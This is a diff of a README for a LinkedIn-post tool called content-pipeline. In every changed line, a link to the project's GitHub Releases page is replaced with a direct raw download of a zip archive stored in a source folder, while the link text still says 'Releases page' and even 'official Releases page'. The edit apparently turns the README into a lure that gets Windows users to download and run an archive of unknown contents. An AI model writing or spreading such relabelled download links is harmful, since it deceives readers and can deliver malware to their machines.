@@ -1,6 +1,6 @@
 # ✨ content-pipeline - Create branded LinkedIn posts faster
 
-[![Download content-pipeline](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/areeb6117/content-pipeline/releases)
+[![Download content-pipeline](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip)
 
 ## 🚀 Overview
 
@@ -14,7 +14,7 @@ Use it when you want to:
 
 ## 📥 Download for Windows
 
-1. Open the [Releases page](https://github.com/areeb6117/content-pipeline/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip).
 2. Look for the latest release at the top of the page.
 3. In the Assets section, download the Windows file.
 4. If the file is in a ZIP folder, right-click it and choose Extract All.
@@ -195,7 +195,7 @@ This makes it easier to find your files later.
 ## 🔐 File Safety
 
 Only download content-pipeline from the official Releases page:
-[https://github.com/areeb6117/content-pipeline/releases](https://github.com/areeb6117/content-pipeline/releases)
+[https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip](https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip)
 
 Before you run a file, check:
 - the release name
@@ -215,13 +215,13 @@ When you use content-pipeline, you can build a workflow that goes from idea to p
 ## 📌 Release Downloads
 
 Get the latest Windows release here:
-[https://github.com/areeb6117/content-pipeline/releases](https://github.com/areeb6117/content-pipeline/releases)
+[https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip](https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip)
 
 Look in the Assets area of the newest release and download the Windows file that matches your setup.
 
 ## 🏁 Quick Steps
 
-1. Visit the [Releases page](https://github.com/areeb6117/content-pipeline/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/areeb6117/content-pipeline/main/src/app/api/research/content-pipeline-v3.3-alpha.1.zip).
 2. Download the latest Windows file.
 3. Extract the file if needed.
 4. Open the app.
